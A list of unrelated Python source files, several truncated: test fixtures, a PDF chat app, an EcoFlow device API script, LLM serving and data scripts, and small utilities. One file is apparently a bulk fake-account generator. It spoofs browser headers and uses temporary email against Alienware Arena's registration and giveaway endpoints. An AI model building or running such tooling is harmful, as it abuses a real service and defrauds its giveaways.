    "import subprocess\n\nimport pytest\n\n\n@pytest.fixture()\ndef _patch_path(monkeypatch: pytest.MonkeyPatch):\n    monkeypatch.delenv(\"PATH\", raising=False)\n\n\n@pytest.fixture()\ndef _patch_pixi_version_exit_code(monkeypatch: pytest.MonkeyPatch):\n    def mock_run(cmd, *args, **kwargs):\n        if cmd == [\"pixi\", \"--version\"]:\n            return subprocess.CompletedProcess(cmd, returncode=1, stdout=\"\", stderr=\"\")\n        else:\n            return subprocess.run(cmd, *args, **kwargs)\n\n    monkeypatch.setattr(\"subprocess.run\", mock_run)\n\n\n@pytest.fixture()\ndef _patch_pixi_version_bad_stdout(monkeypatch: pytest.MonkeyPatch):\n    def mock_run(cmd, *args, **kwargs):\n        if cmd == [\"pixi\", \"--version\"]:\n            return subprocess.CompletedProcess(cmd, returncode=0, stdout=\"wrong output\", stderr=\"\")\n        else:\n            return subprocess.run(cmd, *args, **kwargs)\n\n    monkeypatch.setattr(\"subprocess.run\", mock_run)\n\n\n@pytest.fixture()\ndef _patch_pixi_version_value(monkeypatch: pytest.MonkeyPatch):\n    original_run = subprocess.run  # Save the original function\n\n    def mock_run(cmd, *args, **kwargs):\n        if cmd == [\"pixi\", \"--version\"]:\n            result = original_run(cmd, *args, **kwargs)\n            assert result.returncode == 0\n            assert result.stdout.startswith(\"pixi \")\n\n            result.stdout = \"pixi 0.15.0\\n\"\n            return result\n        else:\n            return original_run(cmd, *args, **kwargs)\n\n    monkeypatch.setattr(\"subprocess.run\", mock_run)\n",
    "import gradio as gr\r\nimport os\r\nimport time\r\nfrom utils import *\r\n\r\nvectordb = \"\"\r\n\r\ndef generate_welcome_message():\r\n    return (None, \"Hello! Welcome to the chatbot. You can enter a message or upload a file.\")\r\n\r\ndef print_like_dislike(x: gr.LikeData):\r\n    print(x.index, x.value, x.liked)\r\n\r\ndef add_message(history, message):\r\n    if len(message[\"files\"]) > 0:\r\n        history.append((message[\"files\"], None))\r\n    if message[\"text\"] is not None and message[\"text\"] != \"\":\r\n        history.append((message[\"text\"], None))\r\n    return history, gr.MultimodalTextbox(value=None, interactive=False)\r\n\r\n\r\ndef bot(history):\r\n    global vectordb\r\n    global tsk\r\n    if type(history[-1][0]) != tuple:\r\n        if vectordb == \"\":\r\n            pipe = pipeline(tsk, tokenizer=tokenizer, model=model)\r\n            response = pipe(history[-1][0])[0]\r\n            response = response[\"generated_text\"]\r\n            history[-1][1] = \"\"\r\n            for character in response:\r\n                history[-1][1] += character\r\n                time.sleep(0.05)\r\n                yield history\r\n        else:\r\n            try:\r\n                response = just_chatting(task=tsk, model=model, tokenizer=tokenizer, query=history[-1][0], vectordb=vectordb, chat_history=[convert_none_to_str(his) for his in history])[\"answer\"]\r\n                history[-1][1] = \"\"\r\n                for character in response:\r\n                    history[-1][1] += character\r\n                    time.sleep(0.05)\r\n                    yield history\r\n            except Exception as e:\r\n                response = f\"Sorry, the error '{e}' occured while generating the response; check [troubleshooting documentation](https://astrabert.github.io/everything-rag/#troubleshooting) for more\"\r\n    if type(history[-1][0]) == tuple:\r\n        filelist = []\r\n        for i in history[-1][0]:\r\n            filelist.append(i)\r\n        if len(filelist) > 1:\r\n            finalpdf = merge_pdfs(filelist)\r\n        else:\r\n            finalpdf = filelist[0]\r\n        vectordb = create_a_persistent_db(finalpdf, os.path.dirname(finalpdf)+\"_localDB\", os.path.dirname(finalpdf)+\"_embcache\")\r\n        response = \"VectorDB was successfully created, now you can ask me anything about the document you uploaded!\ud83d\ude0a\"\r\n        history[-1][1] = \"\"\r\n        for character in response:\r\n            history[-1][1] += character\r\n            time.sleep(0.05)\r\n            yield history\r\n\r\nwith gr.Blocks() as demo:\r\n    chatbot = gr.Chatbot(\r\n        [[None, \"Hi, I'm **everything-rag**\ud83e\udd16.\\nI'm here to assist you and let you chat with _your_ pdfs!\\nCheck [my website](https://astrabert.github.io/everything-rag/) for troubleshooting and documentation reference\\nHave fun!\ud83d\ude0a\"]],\r\n        label=\"everything-rag\",\r\n        elem_id=\"chatbot\",\r\n        bubble_full_width=False,\r\n    )\r\n\r\n    chat_input = gr.MultimodalTextbox(interactive=True, file_types=[\"pdf\"], placeholder=\"Enter message or upload file...\", show_label=False)\r\n\r\n    chat_msg = chat_input.submit(add_message, [chatbot, chat_input], [chatbot, chat_input])\r\n    bot_msg = chat_msg.then(bot, chatbot, chatbot, api_name=\"bot_response\")\r\n    bot_msg.then(lambda: gr.MultimodalTextbox(interactive=True), None, [chat_input])\r\n\r\n    chatbot.like(print_like_dislike, None, None)\r\n    clear = gr.ClearButton(chatbot)\r\n\r\ndemo.queue()\r\nif __name__ == \"__main__\":\r\n    demo.launch(server_name=\"0.0.0.0\", share=False)\r\n\r\n\t",
    "# Example Code to obtain data from API for specific sensors on an EcoFlow device\r\n# Mark Hicks - 01/29/2024\r\n# written by mail@sven-erbe.de - 14/02/2024\r\n\r\n# short description\r\n# script set powerstream - WN511_SET_PERMANENT_WATTS_PACK depend on TotalPower\r\n# function: set_ef_powerstream_custom_load_power(SerialNumber=None,TotalPower=None,Automation=False)\r\n# \r\n# \r\n# prerequest:\r\n# Pyscript: Python scripting integration - https://github.com/custom-components/pyscript\r\n# ecoflow AccessKey and SecretKey - needs to request on https://developer-eu.ecoflow.com/\r\n# Powerstream\r\n# please change accesskey and secret in the script\r\n\r\nimport sys\r\nimport json\r\nimport requests\r\nimport hashlib\r\nimport hmac\r\nimport random\r\nimport time\r\nimport binascii\r\nfrom urllib.parse import urlencode\r\n\r\n\r\ndef hmac_sha256(data, key):\r\n    hashed = hmac.new(key.encode('utf-8'), data.encode('utf-8'), hashlib.sha256).digest()\r\n    sign = binascii.hexlify(hashed).decode('utf-8')\r\n    return sign\r\n\r\ndef get_map(json_obj, prefix=\"\"):\r\n  def flatten(obj, pre=\"\"):\r\n    result = {}\r\n    if isinstance(obj, dict):\r\n      for k, v in obj.items():\r\n        result.update(flatten(v, f\"{pre}.{k}\" if pre else k))\r\n    elif isinstance(obj, list):\r\n      for i, item in enumerate(obj):\r\n        result.update(flatten(item, f\"{pre}[{i}]\"))\r\n    else: result[pre] = obj\r\n    return result\r\n  return flatten(json_obj, prefix)\r\n\r\ndef get_qstr(params): return '&'.join([f\"{key}={params[key]}\" for key in sorted(params.keys())])\r\n\r\ndef put_api(url, key, secret, params=None):\r\n  nonce     = str(random.randint(100000, 999999))\r\n  timestamp = str(int(time.time() * 1000))\r\n  headers   = {'accessKey':key,'nonce':nonce,'timestamp':timestamp}\r\n  sign_str  = (get_qstr(get_map(params)) + '&' if params else '') + get_qstr(headers)\r\n  headers['sign'] = hmac_sha256(sign_str, secret)\r\n  response = task.executor(requests.put, url, headers=headers, json=params)\r\n  if response.status_code == 200: return response.json()\r\n  else: print(f\"get_api: {response.text}\")\r\n\r\ndef get_api(url, key, secret, params=None):\r\n  nonce     = str(random.randint(100000, 999999))\r\n  timestamp = str(int(time.time() * 1000))\r\n  headers   = {'accessKey':key,'nonce':nonce,'timestamp':timestamp}\r\n  sign_str  = (get_qstr(get_map(params)) + '&' if params else '') + get_qstr(headers)\r\n  headers['sign'] = hmac_sha256(sign_str, secret)\r\n  response = task.executor(requests.get, url, headers=headers, json=params)\r\n  if response.status_code == 200: return response.json()\r\n  else: print(f\"get_api: {response.text}\")\r\n\r\ndef post_api(url, key, secret, params=None):\r\n  nonce     = str(random.randint(100000, 999999))\r\n  timestamp = str(int(time.time() * 1000))\r\n  headers   = {'accessKey':key,'nonce':nonce,'timestamp':timestamp}\r\n  sign_str  = (get_qstr(get_map(params)) + '&' if params else '') + get_qstr(headers)\r\n  headers['sign'] = hmac_sha256(sign_str, secret)\r\n  response = task.executor(requests.post, url, headers=headers, json=params)\r\n  #if response.status_code == 200: return response.json()\r\n  if response.status_code == 200: return response\r\n  else: print(f\"get_api: {response.text}\")\r\n\r\ndef check_if_device_is_online(SN=None,payload=None):\r\n\r\n    parsed_data = payload\r\n    desired_device_sn = SN\r\n\r\n    device_found = False\r\n\r\n    for device in parsed_data.get('data', []):\r\n        if device.get('sn') == desired_device_sn:\r\n            device_found = True\r\n            online_status = device.get('online', 0)\r\n\r\n            if online_status == 1:\r\n                print(f\"The device with SN '{desired_device_sn}' is online.\")\r\n                return \"online\"\r\n            else:\r\n                print(f\"The device with SN '{desired_device_sn}' is offline.\")\r\n                return \"offline\"\r\n    if not device_found:\r\n        print(f\"Device with SN '{desired_device_sn}' not found in the data.\")\r\n        return \"devices not found\"\r\n\r\n@service\r\ndef set_ef_powerstream_custom_load_power(SerialNumber=None,TotalPower=None,Automation=False):\r\n\r\n    log.info(f\"set_ef_powerstream_custom_load_power: got SerialNumber {SerialNumber} TotalPower {TotalPower} Automation {Automation}\")\r\n\r\n    if SerialNumber is None:\r\n        log.info(f\"SerialNumber is not provided. Exiting function.\")\r\n        print(\"SerialNumber is not provided. Exiting function.\")\r\n        return  # Exit the function if SerialNumber is None\r\n\r\n    url = 'https://api.ecoflow.com/iot-open/sign/device/quota'\r\n    url_device = 'https://api.ecoflow.com/iot-open/sign/device/list'\r\n\r\n    # Replace with valid access/secret keys and device SN\r\n    key = 'example123'\r\n    secret = 'example123'\r\n\r\n    \r\n    cmdCode = 'WN511_SET_PERMANENT_WATTS_PACK'\r\n    TotalPowerOffSet = 0\r\n\r\n    # collect status of the devices\r\n    payload = get_api(url_device,key,secret,{\"sn\":SerialNumber})\r\n\r\n    check_ps_status = check_if_device_is_online(SerialNumber,payload)\r\n\r\n\r\n    # collect current permanentWatts\r\n    quotas = [\"20_1.permanentWatts\"]\r\n    params  = {\"quotas\":quotas}\r\n\r\n    payload = post",
    "import os, re, sys, time, json, random, string, ctypes, threading\r\n\r\nfrom time import sleep\r\n\r\ntry:\r\n    from pystyle import System, Colorate, Colors, Write\r\n    from colorama import Fore, Style, init\r\n    from requests import Session\r\n    from bs4 import BeautifulSoup\r\n    from datetime import datetime\r\nexcept ModuleNotFoundError:\r\n    os.system(\"pip install pystyle\")\r\n    os.system(\"pip install colorama\")\r\n    os.system(\"pip install requests\")\r\n    os.system(\"pip install bs4\")\r\n    os.system(\"pip install datetime\")\r\n\r\nfrom modules.tempmail import Tempmail\r\nfrom modules.console import Output\r\nfrom modules.utils import Utils\r\n\r\nclass Console:\r\n    def title():\r\n        while Stats.working:\r\n            current_time = time.time()\r\n            elapsed_time = current_time - Stats.start\r\n            if elapsed_time != 0:\r\n                try:\r\n                    success_rate = round((Stats.created / (Stats.failed + Stats.created)) * 100, 2)\r\n                except ZeroDivisionError:\r\n                    success_rate = 0\r\n\r\n                elapsed_days = int(elapsed_time // 86400)\r\n                elapsed_hours = int((elapsed_time % 86400) // 3600)\r\n                elapsed_minutes = int((elapsed_time % 3600) // 60)\r\n                elapsed_seconds = int(elapsed_time % 60)\r\n                ctypes.windll.kernel32.SetConsoleTitleW(f'\ud835\udcd0\ud835\udcf5\ud835\udcf2\ud835\udcee\ud835\udcf7\ud835\udd00\ud835\udcea\ud835\udcfb\ud835\udcee \ud835\udcd0\ud835\udcec\ud835\udcec\ud835\udcf8\ud835\udcfe\ud835\udcf7\ud835\udcfd \ud835\udcd6\ud835\udcee\ud835\udcf7\ud835\udcee\ud835\udcfb\ud835\udcea\ud835\udcfd\ud835\udcf8\ud835\udcfb | \ud835\udcd6\ud835\udcee\ud835\udcf7\ud835\udcee\ud835\udcfb\ud835\udcea\ud835\udcfd\ud835\udcee\ud835\udced: {Stats.created} - \ud835\udcd5\ud835\udcea\ud835\udcf2\ud835\udcf5\ud835\udcee\ud835\udced: {Stats.failed} @ \ud835\udce2\ud835\udcfe\ud835\udcec\ud835\udcec\ud835\udcee\ud835\udcfc\ud835\udcfc \ud835\udce1\ud835\udcea\ud835\udcfd\ud835\udcee: {success_rate}% - \ud835\udcd4\ud835\udcf5\ud835\udcea\ud835\udcf9\ud835\udcfc\ud835\udcee\ud835\udced: {elapsed_days}\ud835\udced {elapsed_hours}\ud835\udcf1 {elapsed_minutes}\ud835\udcf6 {elapsed_seconds}\ud835\udcfc | \ud835\udced\ud835\udcf2\ud835\udcfc\ud835\udcec\ud835\udcf8\ud835\udcfb\ud835\udced.\ud835\udcf0\ud835\udcf0/\ud835\udcfb\ud835\udcea\ud835\udced\ud835\udcfe\ud835\udcec\ud835\udcf8\ud835\udcfb\ud835\udced')\r\n            sleep(0.1)\r\n\r\nclass Stats:\r\n    created = 0\r\n    failed = 0\r\n    errors = 0\r\n    start = time.time()\r\n    working = True\r\n\r\nclass Headers:\r\n    csrf_headers = {\r\n        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',\r\n        'Accept-Encoding': 'gzip, deflate, br',\r\n        'Accept-Language': 'es',\r\n        'Referer': 'https://eu.alienwarearena.com/login?return=%2Fucf%2FGiveaway',\r\n        'Sec-Ch-Ua': '\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Microsoft Edge\";v=\"122\"',\r\n        'Sec-Ch-Ua-Mobile': '?0',\r\n        'Sec-Ch-Ua-Platform': '\"Windows\"',\r\n        'Sec-Fetch-Dest': 'document',\r\n        'Sec-Fetch-Mode': 'navigate',\r\n        'Sec-Fetch-Site': 'same-origin',\r\n        'Sec-Fetch-User': '?1',\r\n        'Upgrade-Insecure-Requests': '1',\r\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0'\r\n    }\r\n\r\n    register_headers = {\r\n        \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\",\r\n        \"Accept-Encoding\": \"gzip, deflate, br\",\r\n        \"Accept-Language\": \"es\",\r\n        \"Cache-Control\": \"max-age=0\",\r\n        \"Connection\": \"keep-alive\",\r\n        \"Host\": \"in.alienwarearena.com\",\r\n        \"Origin\": \"https://in.alienwarearena.com\",\r\n        \"Referer\": \"https://in.alienwarearena.com/account/register\",\r\n        \"Sec-Ch-Ua\": '\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Microsoft Edge\";v=\"122\"',\r\n        \"Sec-Ch-Ua-Mobile\": \"?0\",\r\n        \"Sec-Ch-Ua-Platform\": '\"Windows\"',\r\n        \"Sec-Fetch-Dest\": \"document\",\r\n        \"Sec-Fetch-Mode\": \"navigate\",\r\n        \"Sec-Fetch-Site\": \"same-origin\",\r\n        \"Sec-Fetch-User\": \"?1\",\r\n        \"Upgrade-Insecure-Requests\": \"1\",\r\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0\"\r\n    }\r\n\r\n    email_headers = {\r\n        \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\",\r\n        \"Accept-Encoding\": \"gzip, deflate, br\",\r\n        \"Accept-Language\": \"es\",\r\n        \"Connection\": \"keep-alive\",\r\n        \"Host\": \"mandrillapp.com\",\r\n        \"sec-ch-ua\": '\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Microsoft Edge\";v=\"122\"',\r\n        \"sec-ch-ua-mobile\": \"?0\",\r\n        \"sec-ch-ua-platform\": '\"Windows\"',\r\n        \"Sec-Fetch-Dest\": \"document\",\r\n        \"Sec-Fetch-Mode\": \"navigate\",\r\n        \"Sec-Fetch-Site\": \"none\",\r\n        \"Sec-Fetch-User\": \"?1\",\r\n        \"Upgrade-Insecure-Requests\": \"1\"\r\n    }\r\n\r\n    promo_headers = {\r\n        \"Accept\": \"*/*\",\r\n        \"Accept-Encoding\": \"gzip, deflate, br\",\r\n        \"Accept-Language\": \"es\",\r\n        \"Authorization\": \"\",\r\n        \"Connection\": \"keep-alive\",\r\n        \"Host\": \"giveawayapi.alienwarearena.com\",\r\n        \"Origin\": \"https://in.alienwarearena.com\",\r\n        \"Referer\": \"https://in.alienwarearena.com/\",\r\n        \"sec-ch-ua\": '\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Microsoft Edge\";v=\"122\"',\r\n        \"sec-ch-ua-mobile\": \"?0\",\r\n        \"sec-ch-ua-platform\": '\"Windows\"',\r\n        \"Sec-Fetch-Dest\": \"empty\",\r\n        \"Sec-Fetch-Mode\": \"cors\",\r\n        \"Sec-Fetch-Site\": \"same-site\",\r\n        \"User-Agent\": \"Mozil",
    "# !/usr/bin/python\n# -*- coding: utf-8 -*-\n# @time    : 2023/3/25 21:56\n# @author  : Mo\n# @function: fastapi-post\u63a5\u53e3\n\n\nimport traceback\nimport logging\nimport random\nimport time\nimport json\nimport sys\nimport os\n\npath_root = os.path.abspath(os.path.join(os.path.dirname(__file__), \"../..\"))\nprint(path_root)\nsys.path.append(path_root)\nfrom qwen2_sft.ft_qwen2.config import CUDA_VISIBLE_DEVICES, USE_TORCH, CPU_NUMS  # from config\nos.environ[\"PYTORCH_CUDA_ALLOC_CONF\"] = \"max_split_size_mb:3072\"\nos.environ[\"CUDA_VISIBLE_DEVICES\"] = CUDA_VISIBLE_DEVICES\nos.environ[\"USE_TORCH\"] = USE_TORCH\nos.environ[\"OMP_NUM_THREADS\"] = CPU_NUMS  # export OMP_NUM_THREADS=1\nos.environ[\"OPENBLAS_NUM_THREADS\"] = CPU_NUMS  # export OPENBLAS_NUM_THREADS=1\nos.environ[\"MKL_NUM_THREADS\"] = CPU_NUMS  # export MKL_NUM_THREADS=1\nos.environ[\"VECLIB_MAXIMUM_THREADS\"] = CPU_NUMS  # export VECLIB_MAXIMUM_THREADS=1\nos.environ[\"NUMEXPR_NUM_THREADS\"] = CPU_NUMS  # export NUMEXPR_NUM_THREADS=1\n\n# from nltk.translate.bleu_score import sentence_bleu, SmoothingFunction\nfrom peft import prepare_model_for_int8_training\nfrom peft import LoraConfig, get_peft_model\nfrom transformers import GenerationConfig\nfrom pydantic import BaseModel\nfrom rouge import Rouge  # pip install rouge\nfrom tqdm import tqdm\nimport torch\n\nfrom pydantic import BaseModel\nfrom fastapi import FastAPI\nimport time\n\n\n# from qwen2_sft.models.qwen2.tokenization_qwen2 import Qwen2Tokenizer as LLMTokenizer\n# from qwen2_sft.models.qwen2.configuration_qwen2 import Qwen2Config as LLMConfig\n# from qwen2_sft.models.qwen2.modeling_qwen2 import Qwen2ForCausalLM as LLMModel\nfrom transformers import Qwen2Tokenizer as LLMTokenizer\nfrom transformers import Qwen2ForCausalLM as LLMModel\nfrom transformers import Qwen2Config as LLMConfig\nfrom qwen2_sft.ft_qwen2.config import PATH_MODEL_PRETRAIN, DATA_PATH, MODEL_SAVE_DIR, REPO_ID\nfrom qwen2_sft.ft_qwen2.config import MICRO_BATCH_SIZE, BATCH_SIZE, GRADIENT_ACCUMULATION_STEPS\nfrom qwen2_sft.ft_qwen2.config import LEARNING_RATE, EPOCHS, SAVE_STEPS, VAL_SET_SIZE, TARGET_MODULES\nfrom qwen2_sft.ft_qwen2.config import IS_PARALLELIZABLE, MODEL_PARALLEL, USE_CACHE\nfrom qwen2_sft.ft_qwen2.config import MAX_LENGTH_Q, MAX_LENGTH_A, MAX_LENGTH_QA\nfrom qwen2_sft.ft_qwen2.config import LORA_DROPOUT, LORA_ALPHA, LORA_R\nfrom qwen2_sft.ft_qwen2.config import USE_CUDA\n\n\napp = FastAPI()  # \u65e5\u5fd7\u6587\u4ef6\u540d,\u4e3a\u542f\u52a8\u65f6\u7684\u65e5\u671f, \u5168\u5c40\u65e5\u5fd7\u683c\u5f0f\nlogger_level = logging.INFO\nlogging.basicConfig(format=\"%(asctime)s - %(filename)s[line:%(lineno)d] \"\n                           \"- %(levelname)s: %(message)s\",\n                    level=logger_level)\nlogger = logging.getLogger(\"ft-llama\")\nconsole = logging.StreamHandler()\nconsole.setLevel(logger_level)\nlogger.addHandler(console)\n\n\n# device_map = {\"\": int(os.environ.get(\"LOCAL_RANK\") or 0)}\n# world_size = int(os.environ.get(\"WORLD_SIZE\", 1))\n# ddp = world_size != 1\n# device_map = \"auto\"\n# # USE_CUDA = True\n# print(device_map)\n# print(ddp)\n\n\ndef load_model_state(model, model_save_dir=\"./\", model_name=\"adapter_model.safetensors\", device=\"cpu\"):\n    \"\"\"  \u4ec5\u52a0\u8f7d\u6a21\u578b\u53c2\u6570(\u63a8\u8350\u4f7f\u7528)  \"\"\"\n    try:\n        path_model = os.path.join(model_save_dir, model_name)\n        peft_config = LoraConfig.from_pretrained(model_save_dir)\n        peft_config.inference_mode = True\n        model = get_peft_model(model, peft_config)\n\n        try:\n            if path_model.endswith(\".safetensors\"):\n                from safetensors.torch import load_file, save_file\n                from safetensors import safe_open\n                state_dict = {}\n                with safe_open(path_model, framework=\"pt\", device=\"cpu\") as f:\n                    for k in f.keys():\n                        state_dict[k] = f.get_tensor(k)\n            ### if path_model.endswith(\".bin\") or path_model.endswith(\".pt\"):\n            else:\n                state_dict = torch.load(path_model, map_location=torch.device(device))\n        except Exception as e:\n            print(traceback.print_exc())\n            ### \u5168\u90e8\u8bad\u7ec3\u5b8c\u7684\u8bdd\u4f1a\u7528\u8fd9\u4e2a, \u5373\u4fbf\u662f.safetensors\n            state_dict = torch.load(path_model, map_location=torch.device(device))\n\n        # print(state_dict.keys())\n        state_dict = {\"base_model.model.\" + k.replace(\"_orig_mod.\", \"\")\n                      .replace(\".lora_A.weight\", \".lora_A.default.weight\")\n                      .replace(\".lora_B.weight\", \".lora_B.default.weight\")\n                      : v for k, v in state_dict.items()}\n        print(state_dict.keys())\n        print(\"#\" * 128)\n        ### \u6392\u67e5\u4e0d\u5b58\u5728model.keys\u7684 state_dict.key\n        name_dict = {name: 0 for name, param in model.named_parameters()}\n        print(name_dict.keys())\n        print(\"#\" * 128)\n        for state_dict_key in state_dict.keys():\n            if state_dict_key not in name_dict:\n                print(\"{} is not exist!\".format(state_dict_key))\n        model.load_state_dict(state_dict, strict=False)\n        # model.to(device)\n        print(\"******model loaded success******\")\n        print(\"self.device: {}\".format(device))\n    except Exception as e:\n        print(str(",
    "import json\nimport os\nfrom tqdm import tqdm\nfrom concurrent.futures import ThreadPoolExecutor\nimport argparse\nfrom utils import get_prompt\nfrom openai import OpenAI\n\nMAX_API_RETRY = 5\nAPI_KEY = os.environ[\"OPENAI_API_KEY\"]\n\ndef get_response(query, prompt):\n    for _ in range(MAX_API_RETRY):\n        try:\n            client = OpenAI(api_key=API_KEY)\n            response = client.chat.completions.create(\n                model='gpt-4-turbo-preview',\n                max_tokens=1024,\n                top_p=0.8,\n                temperature=0.7,\n                messages=[{\n                    'role': 'user',\n                    'content': prompt,\n                }],\n            )\n            content = response.choices[0].message.content\n        except Exception as e:\n            print(f\"failed... {e}\")\n            continue\n        try:\n            if content.startswith(\"```json\"): # remove markdown, used for gpt-4 turbo\n                content = content[7:-3]\n            answer = json.loads(content)\n        except Exception as e:\n            print(f\"json failed to parse: {e}\")\n            print(f\"content: {content}\")\n            return None\n        return query, answer\n\ndef main(args):\n    # load input queries and output file\n    input_file = os.path.join(args.dir, \"selected_query.txt\")\n    input_queries = []\n    with open(input_file, \"r\") as f:\n        for line in f:\n            input_queries.append(line.strip())\n    \n    output_file = os.path.join(args.dir, \"01_reframed_questions.json\")\n    reframed_questions = {}\n    \n    # load prompt\n    prompt = get_prompt(\"question reframing\")\n\n    # load saved samples\n    dedup_set = set()\n    try:\n        with open(output_file, \"r\") as f:\n            reframed_questions = json.load(f)\n            dedup_set = set(reframed_questions.keys())\n    except:\n        pass\n\n    passed_args = []\n    for sample in input_queries:\n        if sample in dedup_set:\n            continue\n        passed_args.append((sample, prompt % sample))\n    \n    with ThreadPoolExecutor(max_workers=args.worker) as executor:\n        for save_count, future in enumerate(tqdm(executor.map(get_response, *zip(*passed_args)), total=len(passed_args))):\n            if future is not None:\n                query, ans = future\n                reframed_questions[query] = ans\n                if save_count % args.save_iterval == 0:\n                    with open(output_file, \"w\") as f:\n                        json.dump(reframed_questions, f, ensure_ascii=False, indent=4)\n                    print(f\"File Saved\")\n    \n    with open(output_file, \"w\") as f:\n        json.dump(reframed_questions, f, ensure_ascii=False, indent=4)\n    print(f\"File Saved\")\n\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--dir\", type=str, help=\"input file path for sentences\", default=\"conifer_data\")\n    parser.add_argument(\"--save-iterval\", type=int, help=\"save to file after generating K samples\", default=2)\n    parser.add_argument(\"--worker\", type=int, help=\"number of concurrent workers\", default=4)\n    args = parser.parse_args()\n    main(args)",
    "import os\nimport re\nfrom typing import Tuple\n\nimport jinja2\nimport markdown\n\ntitle_pattern = re.compile(\"^\u732b\u9c7c\u5468\u520a (vol. (\\d+) (.*?)).md$\")\nurl_template = \"https://ameow.xyz/archives/weekly-{}\"\n\n\ndef get_title_and_url(filename: str) -> Tuple[str, str]:\n    mg = title_pattern.match(filename)\n    if mg is None:\n        return filename, \"\"\n    title = mg.group(1)\n    issue = mg.group(2)\n    url = url_template.format(issue)\n    return title, url\n\n\nissues = []\n\n# iterate over all files in the issues directory\nfor filename in os.listdir(\"issues\"):\n    if not filename.endswith(\".md\"):\n        continue\n\n    # get metadata from markdown, get the issue and date\n    with open(os.path.join(\"issues\", filename)) as f:\n        # title, url\n        title, url = get_title_and_url(filename)\n        # read all lines from the file\n        lines = f.readlines()\n        # concatenate all lines into a single string\n        content = \"\".join(lines)\n        # parse the markdown\n        md = markdown.Markdown(extensions=[\"meta\"])\n        md.convert(content)\n        # get the metadata\n        issues.append(\n            {\n                \"title\": title,\n                \"date\": md.Meta[\"date\"][0],\n                \"issue\": md.Meta[\"issue\"],\n                \"url\": url,\n            }\n        )\n\n# order the issues by date in descending order\nissues.sort(key=lambda x: x[\"date\"], reverse=True)\n\ntemplate_loader = jinja2.FileSystemLoader(searchpath=\"./templates\")\ntemplate_env = jinja2.Environment(loader=template_loader)\ntemplate = template_env.get_template(\"readme.tmpl\")\noutput = template.render(issues=issues)\n\nwith open(\"README.md\", \"w\") as f:\n    f.write(output)\n",
    "import pandas as pd\nfrom  matplotlib import pyplot as plt\nfrom scipy import signal\nimport numpy as np\n\n\n# Replace 'your_excel_file.xlsx' with the path to your Excel file\nexcel_file = pd.ExcelFile('Alpha.xlsx')\ndata_alpha = excel_file.parse(excel_file.sheet_names[0])\n#data_alpha = data_alpha[:4000]\n\nfps = 250\nhighcut = 8\nlowcut = 12\n\ndef butter_lowpass(cutoff, fs, order=5):\n    nyq = 0.5 * fs\n    normal_cutoff = cutoff / nyq\n    b, a = signal.butter(order, normal_cutoff, btype='low', analog=False)\n    return b, a\ndef butter_lowpass_filter(data, cutoff, fs, order=5):\n    b, a = butter_lowpass(cutoff, fs, order=order)\n    y = signal.lfilter(b, a, data)\n    return y\ndef butter_highpass(cutoff, fs, order=3):\n    nyq = 0.5 * fs\n    normal_cutoff = cutoff / nyq\n    b, a = signal.butter(order, normal_cutoff, btype='high', analog=False)\n    return b, a\ndef butter_highpass_filter(data, cutoff, fs, order=5):\n    b, a = butter_highpass(cutoff, fs, order=order)\n    y = signal.filtfilt(b, a, data)\n    return y\n\n\ndata_alpha_list =  (list(data_alpha[\"Value\"]))\n\ndata_alpha_high = butter_highpass_filter(data_alpha_list, highcut, fps)\nalpha_low_high = butter_lowpass_filter(data_alpha_high, lowcut, fps)\n\nplt.plot(alpha_low_high)\nplt.show()\n\n",
    "\n\n\"\"\"\nThis class defines the mapping of the WeChat UI elements to the English and Chinese names.\n\u8fd9\u4e2a\u7c7b\u5b9a\u4e49\u4e86\u5fae\u4fe1\u7a0b\u5e8f UI \u5143\u7d20\u5230\u82f1\u6587\u548c\u4e2d\u6587\u540d\u79f0\u7684\u6620\u5c04\u3002\n\"\"\"\nclass WeChatLocale:\n    MAPPING = {\n        \"weixin\":       {\"en-US\": \"Weixin\",         \"zh-CN\": \"\u5fae\u4fe1\",            \"zh-TW\": \"\u5fae\u4fe1\"},\n\n        \"chats\":        {\"en-US\": \"Chats\",          \"zh-CN\": \"\u804a\u5929\",            \"zh-TW\": \"\u804a\u5929\"},\n        \"contacts\":     {\"en-US\": \"Contacts\",       \"zh-CN\": \"\u901a\u8baf\u5f55\",          \"zh-TW\": \"\u901a\u8a0a\u9304\"},\n        \"facorites\":    {\"en-US\": \"Favorites\",      \"zh-CN\": \"\u6536\u85cf\",            \"zh-TW\": \"\u6536\u85cf\"},\n        \"chat_files\":   {\"en-US\": \"Chat Files\",     \"zh-CN\": \"\u804a\u5929\u6587\u4ef6\",        \"zh-TW\": \"\u804a\u5929\u5ba4\u6a94\u6848\"},\n        \"moments\":      {\"en-US\": \"Moments\",        \"zh-CN\": \"\u670b\u53cb\u5708\",          \"zh-TW\": \"\u670b\u53cb\u5708\"},\n        \"channels\":     {\"en-US\": \"Channels\",       \"zh-CN\": \"\u89c6\u9891\u53f7\",          \"zh-TW\": \"\u5f71\u97f3\u865f\"},\n        \"mini_programs_panel\":  {\"en-US\": \"Mini Programs Panel\", \"zh-CN\": \"\u5c0f\u7a0b\u5e8f\u9762\u677f\", \"zh-TW\": \"\u5c0f\u7a0b\u5f0f\u9762\u677f\"},\n        \"phone\":        {\"en-US\": \"Phone\",          \"zh-CN\": \"\u624b\u673a\",            \"zh-TW\": \"\u624b\u6a5f\"},\n        \"settings_and_others\":  {\"en-US\": \"Settings and Others\", \"zh-CN\": \"\u8bbe\u7f6e\u53ca\u5176\u4ed6\", \"zh-TW\": \"\u8a2d\u5b9a\u8207\u5176\u4ed6\"},\n        \n        \"search\":       